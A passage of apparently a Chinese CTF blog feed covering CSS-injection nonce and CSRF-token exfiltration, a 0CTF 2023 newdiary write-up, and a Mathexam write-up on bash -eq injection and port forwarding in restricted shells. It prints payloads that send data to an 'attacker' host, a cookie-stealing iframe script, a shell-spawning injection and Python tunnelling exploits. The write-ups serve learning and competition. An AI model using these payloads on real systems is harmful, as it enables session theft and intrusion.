form:has(input[name="csrf-token"][value^="ac"]){ background: url("http://attacker/?q=c"); } ... 后面的过程依次类推。 这种方式也有一些需要注意的地方： 浏览器对同一个域名发起的请求有上限。如果请求太多仍旧会被限制，但也可以通过设置多个子域名来绕过限制，比如 a.attacker.com，b.attacker.com。 firefox 下 payload 有所不同，原因在于 firefox 不会逐个 import css，而是一次性加载，这样就达不到分阶段确认字符的目的。 Michał Bentkowski 的文章提出了解决办法：CSS data exfiltration in Firefox via a single injection point - research.securitum.com chrome 和 firefox 通用 payload： &lt;style&gt;@import url(https://myserver.com/payload?len=1)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=2)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=3)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=4)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=5)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=6)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=7)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=8)&lt;/style&gt; 更快的枚举 文章 Code Vulnerabilities Put Proton Mails at Risk - Sonar 展示了一种更快的枚举方式。 通过示例代码可以更好地理解： &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="Content-Security-Policy" content="script-src 'nonce-aaaqhkkzvf5mc3iv090nyysyq6wc80ai4v1'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline'"&gt; &lt;/head&gt; &lt;style&gt; :has(script[nonce*="aaa"]){--tosend-aaa: url(http://192.168.137.98:7777?x=aaa);} :has(script[nonce*="aab"]){--tosend-aab: url(http://192.168.137.98:7777?x=aab);} :has(script[nonce*="aac"]){--tosend-aac: url(http://192.168.137.98:7777?x=aac);} input{ background: var(--tosend-aaa, none), var(--tosend-aab, none), var(--tosend-aac, none), var(--tosend-aad, none) } &lt;/style&gt; &lt;body&gt; &lt;input&gt; &lt;script nonce="nonce-aaaqhkkzvf5mc3iv090nyysyq6wc80ai4v1"&gt; console.log(1) &lt;/script&gt; &lt;/body&gt; 页面中的 CSP 设置了 nonce 值，只有 nonce 属性值与 CSP 中设置的值相同的 JS 内链脚本才能够被执行，这个机制通常用于 XSS 防护。攻击者需要窃取到该值才能够正常运行 XSS。 其中 css 注入 payload 如下。 :has(script[nonce*="aaa"]){--tosend-aaa: url(http://192.168.137.98:7777?x=aaa);} input{ background: var(--tosend-aaa, none), var(--tosend-aab, none), var(--tosend-aac, none), var(--tosend-aad, none) } 其作用就是在页面选择 nonce 值包含了 aaa 的 script 标签（*= 表示 nonce 值含有 aaa 时），如果能够选择到，则设定一个自定义属性 tosend-aaa（自定义属性以 – 开头），通过这个属性向外发起请求。 定义 input 样式的作用在于调用自定义参数，从而触发向外的请求，换用其他标签也同样可以，例如 div。 由于 nonce 中存在 aaa，因此可以受到一个 aaa 的请求： 如何获取完整的字符串呢？假设 none 值为 32 位随机字符串： qhkkzvf5mc3iv090nyysyq6wc80ai4v1 我们可以通过上面的方式，每次获取 3 位的子串，获取到 30 个不重复的子串，通过回溯的方式即可恢复整个字符串。比如 f5m 的后两位为 5m, 5m 又是 5mc 的开头，那么就可以确认 f5m 后一个字符为 c。 {'f5m', 'c3i', 'i4v', '3iv', 'zvf', 'iv0', 'syq', '0ai', '6wc', 'kkz', 'yq6', 'q6w', '5mc', 'c80', '4v1', 'ysy', '0ny', 'yys', 'ai4', '090', 'v09', 'nyy', 'mc3', 'hkk', 'qhk', 'vf5', 'kzv', 'wc8'} 这样一来，只需要较少的请求就可以获取完整的字符串。 0CTF 2023 newdiary 前几天的 0CTF 2023 newdiary 这道题就是考察的 CSS 注入的利用。 题目设定了一个 XSS 的场景，用户可以发布内容并分享给后台 bot，bot 的 cookie 设定为 FLAG，因此我们需要通过 XSS 获取到 FLAG。 题目没有进行 XSS 的过滤，但设定了 CSP，即使能够插入 js 代码，由于无法确认 nonce 值，代码也无法执行。 &lt;meta http-equiv="Content-Security-Policy" content="script-src 'nonce-qhkkzvf5mc3iv090nyysyq6wc80ai4v1'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com"&gt; 但 CSP style-src 设置为 ‘unsafe-inline’ https://unpkg.com”，允许内联执行，并信任来自 unpkg.com 的 css，所以这道题的思路就是利用 css 注入来窃取 nonce 值。 利用步骤如下： 新建一个笔记 redirect，id 为 0，内容如下，该 payload 可以达成重定向的效果。在无法使用 js 时，可以通过 mata 来完成重定向，meta 标签通常不会被过滤。 &lt;meta http-equiv="refresh" content="0.0;url=http://192.168.137.98:8888/index.html"&gt; 其中 index.html 内容如下： &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; const sleep = (milliseconds) =&gt; new Promise(resolve =&gt; setTimeout(resolve, milliseconds)); async function run(){ bot_window = window.open("http://localhost/share/read#id=1&amp;username="); // Exploit 1, leak nonce await sleep(7000); bot_window.location.href = "http://localhost/share/read#id=2&amp;username="; // Exploit 2, leak cookie await sleep(100); console.log("O"); } run(); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 其主要功能是让 bot 通过 window.open 打开新的标签，然后访问 id=1 的笔记。等待一段时间后，再重定向到 id=2 的笔记。 新建一个笔记 steal，id 为 1,内容为窃取 nonce 值的 css 脚本。由于题目信任来自 unpkg.com 的 css 文件，我们可以先将泄露 nonce 值的 css 上传到 unpkg.com 中。 &lt;link rel="stylesheet" href="http://unpkg.com/xxx/leak.css"&gt;&lt;input /&gt; 当 bot 访问 id=0 的笔记时，会被重定向到攻击者页面，打开新的标签页，访问 id=1 的笔记。接着加载 leak.css 泄流出 id=1 页面的 nonce 值。此时 bot 进入等待时间。 枚举到 nonce 值后，新建一个笔记 flag，id 为 2，写入获取 cookie 值的 payload，nonce 值为刚才窃取到的值 &lt;iframe name=asd srcdoc="&lt;script nonce=xxxx &gt;top.location='http://attacker/flag?flag='+encodeURI(document['cookie'])&lt;/script&gt;"/&gt; 因为页面设置了 script-src 为 nonce，禁止了 js 脚本的内联执行，因此这里使用 iframe 打开子窗口来加载 js 代码。 bot 结束等待时间，访问 id=2 的页面，执行 js 代码将 cookie 发送到远程。 这里需要注意的是，页面的重定向（刷新）通常会导致 nonce 值发生变化，但题目环境是通过 url 中的 hash 值（# 之后的部分）来更新页面内容的，nonce 值有一个特点，# 之后的部分改变时，nonce 值不会发生变化，这也是这道题的一个关键点。 题目 payload 可参考：CTF-Writeups/0ctf - 2023/newdiary/README.md at main · salvatore-abello/CTF-Writeups 使用时注意将 index.html 放在 tempalte 目录下。启动 server.py 后，访问 /exploit。 参考 CTF-Writeups/0ctf - 2023/newdiary/README.md at main · salvatore-abello/CTF-Writeups Beyond XSS]]></summary></entry><entry><title type="html">0CTF/TCTF 2023 Mathexam Writeup</title><link href="/ctf/2023/12/11/0CTF-2023-Mathexam-Writeup.html" rel="alternate" type="text/html" title="0CTF/TCTF 2023 Mathexam Writeup" /><published>2023-12-11T18:29:48+08:00</published><updated>2023-12-11T18:29:48+08:00</updated><id>/ctf/2023/12/11/0CTF-2023-Mathexam-Writeup</id><content type="html" xml:base="/ctf/2023/12/11/0CTF-2023-Mathexam-Writeup.html"><![CDATA[<h1 id="0ctf-mathexam-writeup">0CTF Mathexam Writeup</h1>
<p>mathexam 系列非常有意思，主要考察如何在受限的 bash 下完成端口转发，题目的场景可以适用到一些小设备的渗透中。利用思路总结如下：</p>
<ol>
  <li>mathexam-1：bash -eq 注入</li>
  <li>mathexam-2：利用 busybox nc 完成端口转发。</li>
  <li>mathexam-3：去掉了 buxybox，利用 cat 完成端口转发。</li>
  <li>mathexam-4：进一步去掉了 cat，需要利用纯粹的 bash 完成端口转发。</li>
</ol>

<h2 id="mathexam-1">mathexam-1</h2>
<blockquote>
  <p>The math exam starts now. Participate with integrity and never cheat.</p>

  <p>Someone has stolen the exam paper, and definitely he got full marks.
Fortunately, he didn’t find the flag.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nb">echo</span> <span class="s2">"You are now in the math examination hall."</span>
<span class="nb">echo</span> <span class="s2">"First, please read exam integrity statement:"</span>
<span class="nb">echo</span> <span class="s2">""</span>

<span class="nv">promisetext</span><span class="o">=</span><span class="s2">"I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment"</span>
<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$promisetext</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">""</span>

<span class="nb">echo</span> <span class="s2">"Now, write down the exam integrity statement here:"</span>
<span class="nb">read </span>userinput

<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$userinput</span><span class="s2">"</span> <span class="o">=</span> <span class="s2">"</span><span class="nv">$promisetext</span><span class="s2">"</span> <span class="o">]</span>
<span class="k">then
    </span><span class="nb">echo</span> <span class="s2">"All right"</span>
<span class="k">else
    </span><span class="nb">echo</span> <span class="s2">"Error"</span>
    <span class="nb">exit
</span><span class="k">fi

</span><span class="nb">echo</span> <span class="s2">""</span>
<span class="nb">echo</span> <span class="s2">"Exam starts"</span>
<span class="nb">echo</span> <span class="s2">"(notice: numbers in dec, oct or hex format are all accepted)"</span>
<span class="nb">echo</span> <span class="s2">""</span>

<span class="nv">correctcount</span><span class="o">=</span>0
<span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..100<span class="o">}</span>
<span class="k">do
    </span><span class="nb">echo</span> <span class="s2">"Problem </span><span class="nv">$i</span><span class="s2"> of 100:"</span>
    <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2"> + </span><span class="nv">$i</span><span class="s2"> = ?"</span>

    <span class="nv">ans</span><span class="o">=</span><span class="k">$((</span><span class="nv">$i</span><span class="o">+</span><span class="nv">$i</span><span class="k">))</span>
    <span class="nb">read </span>line

    <span class="k">if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span> <span class="nt">-eq</span> <span class="s2">"</span><span class="nv">$ans</span><span class="s2">"</span> <span class="o">]]</span>
    <span class="k">then
        </span><span class="nv">correctcount</span><span class="o">=</span><span class="s2">"</span><span class="k">$((</span><span class="nv">$correctcount</span><span class="o">+</span><span class="m">1</span><span class="k">))</span><span class="s2">"</span>
    <span class="k">fi
    </span><span class="nb">echo</span> <span class="s2">""</span>
<span class="k">done

</span><span class="nb">echo</span> <span class="s2">"Exam finishes"</span>
<span class="nb">echo</span> <span class="s2">"You score is: </span><span class="nv">$correctcount</span><span class="s2">"</span>

<span class="nb">exit</span>
</code></pre></div></div>
<p>题目给了一个 bash 脚本，获取用户输入并使用 -eq 进行了比较。bash 脚本中这样的语句是可以注入的：<code class="language-plaintext highlighter-rouge">[[ "$VAR" -eq "something" ]]</code>，具体可参考文章：<a href="https://dev.to/greymd/eq-can-be-critically-vulnerable-338m">Arithmetic operation in shell script can be exploited - DEV Community</a></p>

<p>注入 poc：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x[<span class="si">$(</span><span class="nb">command</span><span class="si">)</span><span class="o">]</span>
</code></pre></div></div>
<p>测试命令时可以发现题目会将错误输出出来，但是标准输出看不到，因此我们将标准输出重定向到错误输出。另外目标环境有 busybox，可以使用下面的 payload 打开交互式 shell，就可以拿到 flag1。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x[<span class="si">$(</span>/bin/busybox sh 1&gt;&amp;2<span class="si">)</span><span class="o">]</span>
</code></pre></div></div>

<h2 id="mathexam-2">mathexam-2</h2>
<p>拿到第一关 shell 后，可以在根目录中找到一个 .connect.sh.swp 文件，获取该文件的内容可知 second 主机的用户名密码为 ctf:x5kdkwjr8exi2bf70y8g80bggd2nuepf。</p>

<p>获取第二关的 flag 要求我们 ssh 登陆到 second 主机中，但目标环境设置了诸多限制：</p>
<ol>
  <li>没有 ssh</li>
  <li>仅有的二进制文件都在 /bin 目录下
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> drwxr-xr-x    1 0        0             4096 Dec 10 00:11 <span class="nb">.</span>
 drwxr-xr-x    1 0        0             4096 Dec 10 00:11 ..
 <span class="nt">-rwxr-xr-x</span>    1 0        0          1396520 Dec  9 18:44 bash
 <span class="nt">-rwxr-xr-x</span>    1 0        0          2193264 Dec 10 00:11 busybox
 <span class="nt">-rwxr-xr-x</span>    1 0        0            35280 Dec 10 00:11 <span class="nb">cat</span>
 <span class="nt">-rwxr-xr-x</span>    1 0        0           138208 Dec 10 00:11 <span class="nb">ls
 </span>lrwxrwxrwx    1 0        0                4 Dec  9 18:44 sh -&gt; bash
</code></pre></div>    </div>
  </li>
  <li>当前用户对所有文件都没有写权限。</li>
</ol>

<p>也就是说我们需要利用 busybox、bash、cat 来做端口转发，具体思路如下：</p>
<ol>
  <li>通过 busybox nc 连接到 second。此时 busybox nc 与 ssh 服务建立起了 TCP 连接。
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>busybox nc second 22
</code></pre></div>    </div>
  </li>
  <li>我们只需要在该连接中收发数据即可完成 ssh 认证，我们可以通过 python 中的 subprocess 模块来控制终端数据的收发，以此来实现端口转发。</li>
</ol>

<p>编写脚本如下。</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">subprocess</span>
<span class="kn">import</span> <span class="n">threading</span>
<span class="kn">import</span> <span class="n">select</span><span class="p">,</span><span class="n">os</span><span class="p">,</span><span class="n">time</span>
<span class="c1"># 命令和参数
</span><span class="n">command</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">nc</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-X</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">connect</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-x</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">instance.0ctf2023.ctf.0ops.sjtu.cn:18081</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">kctgxr4bjb6kgj26</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">]</span>

<span class="c1"># 启动进程
</span><span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nc">Popen</span><span class="p">(</span>
    <span class="n">command</span><span class="p">,</span> 
    <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> 
    <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> 
    <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span>
    <span class="n">bufsize</span><span class="o">=</span><span class="mi">0</span>  <span class="c1"># 设置为 0 以关闭缓冲
</span><span class="p">)</span>

<span class="n">thread_close</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">def</span> <span class="nf">read_output</span><span class="p">(</span><span class="n">process</span><span class="p">):</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">thread_close</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
            <span class="k">break</span>
        <span class="c1"># 检查是否有数据可读
</span>        <span class="n">reads</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">select</span><span class="p">.</span><span class="nf">select</span><span class="p">([</span><span class="n">process</span><span class="p">.</span><span class="n">stdout</span><span class="p">],</span> <span class="p">[],</span> <span class="p">[],</span> <span class="mf">0.1</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">reads</span><span class="p">:</span>
            <span class="c1"># 获取文件描述符
</span>            <span class="n">fd</span> <span class="o">=</span> <span class="n">process</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">fileno</span><span class="p">()</span>
            <span class="c1"># 读取可用的数据
</span>            <span class="n">output</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">4096</span><span class="p">)</span>  <span class="c1"># 读取最多 4096 字节
</span>            <span class="k">if</span> <span class="n">output</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="n">output</span><span class="p">.</span><span class="nf">decode</span><span class="p">(),</span> <span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>

<span class="c1"># 创建并启动线程
</span><span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">read_output</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">process</span><span class="p">,))</span>
<span class="n">thread</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>

<span class="c1"># 发送命令
</span><span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>
<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">x[$(/bin/busybox sh 1&gt;&amp;2)] </span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">busybox ping -c 1 second</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>

<span class="c1">#监听端口，建立通道
</span><span class="kn">import</span> <span class="n">socket</span>

<span class="c1"># 设置监听端口
</span><span class="n">listen_port</span> <span class="o">=</span> <span class="mi">3333</span>

<span class="c1"># 创建 socket 对象
</span><span class="n">server_socket</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">server_socket</span><span class="p">.</span><span class="nf">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">server_socket</span><span class="p">.</span><span class="nf">bind</span><span class="p">((</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="n">listen_port</span><span class="p">))</span>
<span class="n">server_socket</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Listening on port </span><span class="si">{</span><span class="n">listen_port</span><span class="si">}</span><span class="s">...</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># 接受一个连接
</span><span class="n">client_socket</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">server_socket</span><span class="p">.</span><span class="nf">accept</span><span class="p">()</span>
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Connection from </span><span class="si">{</span><span class="n">addr</span><span class="si">}</span><span class="s"> established.</span><span class="sh">"</span><span class="p">)</span>
<span class="n">thread_close</span><span class="o">=</span><span class="mi">1</span>
<span class="c1"># 等待线程结束
</span><span class="n">thread</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">busybox nc second 22</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">socket_read_output</span><span class="p">(</span><span class="n">process</span><span class="p">):</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="c1"># 检查 process.stdout 是否有数据可读
</span>        <span class="n">reads</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">select</span><span class="p">.</span><span class="nf">select</span><span class="p">([</span><span class="n">process</span><span class="p">.</span><span class="n">stdout</span><span class="p">,</span> <span class="n">client_socket</span><span class="p">],</span> <span class="p">[],</span> <span class="p">[],</span> <span class="mf">0.1</span><span class="p">)</span>
        <span class="c1"># 如果 process.stdout 有数据可读，则将数据发送到客户端
</span>        <span class="k">if</span> <span class="n">process</span><span class="p">.</span><span class="n">stdout</span> <span class="ow">in</span> <span class="n">reads</span><span class="p">:</span>
            <span class="n">fd</span> <span class="o">=</span> <span class="n">process</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">fileno</span><span class="p">()</span>
            <span class="n">output</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">4096</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">output</span><span class="p">:</span>
                <span class="n">client_socket</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">socket_write_output</span><span class="p">(</span><span class="n">process</span><span class="p">):</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="c1"># 使用 select 监测客户端 socket 是否有数据可读
</span>        <span class="n">reads</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">select</span><span class="p">.</span><span class="nf">select</span><span class="p">([</span><span class="n">client_socket</span><span class="p">],</span> <span class="p">[],</span> <span class="p">[],</span> <span class="mf">0.1</span><span class="p">)</span>
        <span class="c1"># 如果客户端有数据可读，则将数据发送到 process.stdin
</span>        <span class="k">if</span> <span class="n">client_socket</span> <span class="ow">in</span> <span class="n">reads</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">client_socket</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
                <span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
                <span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>


<span class="n">thread1</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">socket_read_output</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">process</span><span class="p">,))</span>
<span class="n">thread1</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
<span class="n">thread2</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">socket_write_output</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">process</span><span class="p">,))</span>
<span class="n">thread2</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>

<span class="n">thread1</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
<span class="n">thread2</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>

<span class="n">client_socket</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="n">server_socket</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Connection closed.</span><span class="sh">"</span><span class="p">)</span>

<span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>
<p>执行该脚本后，会将本地的 3333 端口转发到 second 的 22 端口，这样我们就可以连接到 second 了。</p>
<h2 id="mathexam-3">mathexam-3</h2>
<p>连接到 second 后，flag 文件中会提示第三关的 flag 在 third 主机上，用户名密码不变，我们需要再构建一层代理。不同在与 second 主机中将 busybox 移除了。</p>

<p>没有 nc 的情况下，我们仍然可以使用 exec 或者 cat 连接到远程端口，参考：</p>
<ul>
  <li><a href="https://andreafortuna.org/2021/03/06/some-useful-tips-about-dev-tcp/">Some useful tips about /dev/tcp | Andrea Fortuna</a>
比如：
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> &lt;/dev/tcp/time.nist.gov/13
</code></pre></div>    </div>
    <p>或者使用 exec 将 tcp 连接绑定到描述符 3,然后通过 echo 或者 cat 收发数据。</p>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec </span>3&lt;<span class="o">&gt;</span>/dev/tcp/www.google.com/80
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"GET / HTTP/1.1</span><span class="se">\r\n</span><span class="s2">host: http://www.google.com</span><span class="se">\r\n</span><span class="s2">Connection: close</span><span class="se">\r\n\r\n</span><span class="s2">"</span> <span class="o">&gt;</span>&amp;3
<span class="nb">cat</span> &lt;&amp;3
</code></pre></div>    </div>
    <p>根据这个原理，我们就可以构建出一个类似的收发窗口：</p>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec </span>3&lt;<span class="o">&gt;</span>/dev/tcp/third/22   
<span class="nb">cat</span> &lt;&amp;3 &amp;
<span class="nb">cat</span> <span class="o">&gt;</span>&amp;3
</code></pre></div>    </div>
  </li>
</ul>

<ol>
  <li>前两行代码可以替代 <code class="language-plaintext highlighter-rouge">busybox nc third 22</code>，利用 &amp; 可以将读取远程消息的任务放在后台，一旦接收到数据，就可以直接打印在标准输出中。</li>
  <li>cat &gt;&amp;3 会等待用户的输入，用户输入之后会重定向到描述符 3 中，python 脚本中就可以直接用 process.stdin.write 发数据就可以了。</li>
</ol>

<p>利用脚本与上一关的类似，在此前的脚本中做修改即可，需要注意的就是需要在收发前，先执行上面构造的 payload。</p>

<p>exp2.py</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">subprocess</span>
<span class="kn">import</span> <span class="n">threading</span>
<span class="kn">import</span> <span class="n">select</span><span class="p">,</span><span class="n">os</span><span class="p">,</span><span class="n">time</span>
<span class="kn">import</span> <span class="n">binascii</span>

<span class="c1"># 命令和参数
</span><span class="n">command</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">ssh</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">ctf@127.0.0.1</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">-p</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">3333</span><span class="sh">"</span><span class="p">]</span>

<span class="bp">...</span>

<span class="c1"># 创建并启动线程
</span><span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">read_output</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">process</span><span class="p">,))</span>
<span class="n">thread</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="c1">#手动输入密码 x5kdkwjr8exi2bf70y8g80bggd2nuepf
</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">whoami</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>

<span class="bp">...</span>

<span class="n">listen_port</span> <span class="o">=</span> <span class="mi">4444</span>

<span class="bp">...</span>

<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">exec 3&lt;&gt;/dev/tcp/third/22</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">cat &lt;&amp;3 &amp; </span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
